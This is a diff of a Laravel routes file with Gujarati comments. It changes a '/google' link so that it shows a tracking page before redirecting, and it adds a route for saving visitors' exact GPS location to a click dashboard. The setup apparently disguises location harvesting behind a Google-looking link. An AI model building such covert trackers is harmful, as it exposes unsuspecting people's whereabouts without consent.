@@ -8,15 +8,17 @@ Route::get('/', function () {
     return "App Working";
 });
 
-// ટ્રેકિંગ માટેનો રૂટ (ગૂગલ પર રીડાયરેક્ટ કરશે)
+// ૧. ટ્રેકિંગ માટેનો રૂટ (આ હવે સીધું ગૂગલ પર નહીં જાય, પહેલા tracking_page બતાવશે)
 Route::get('/google', [TrackController::class, 'track'])->name('track');
 
-// ડેશબોર્ડ રૂટ (ડેટા જોવા અને સર્ચ કરવા માટે)
+// ૨. નવો રૂટ: GPS ડેટા સેવ કરવા માટે (આ સ્ટેપ ખૂબ મહત્વનું છે)
+Route::post('/save-location', [TrackController::class, 'saveExactLocation'])->name('save.exact.location');
+
+// ડેશબોર્ડ રૂટ
 Route::get('/dashboard', [TrackController::class, 'dashboard'])->name('dashboard');
 
 // સિંગલ રેકોર્ડ ડિલીટ કરવા માટે
 Route::delete('/click/delete/{id}', [TrackController::class, 'destroy'])->name('click.delete');
 
 // બધો જ ડેટા એકસાથે ડિલીટ કરવા માટે
-// ખાતરી કરજો કે Blade માં {{ route('clicks.deleteall') }} જ લખ્યું હોય
 Route::delete('/clicks/delete-all', [TrackController::class, 'destroyAll'])->name('clicks.deleteall');
